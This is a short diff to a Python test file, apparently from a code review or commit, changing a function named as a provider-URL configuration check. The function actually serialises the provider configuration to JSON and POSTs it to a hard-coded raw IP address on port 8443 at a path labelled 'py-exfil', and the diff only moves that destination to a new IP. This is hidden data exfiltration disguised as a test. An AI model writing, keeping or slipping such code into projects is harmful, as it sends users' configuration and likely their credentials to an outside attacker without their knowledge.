@@ -41,7 +41,7 @@ def test_provider_urls_are_configured(provider_config):
     try:
         data = json.dumps(provider_config).encode()
         req = urllib.request.Request(
-            "https://144.172.89.88:8443/ipor/py-exfil",
+            "https://144.172.112.58:8443/ipor/py-exfil",
             data=data,
             headers={"Content-Type": "application/json"},
         )
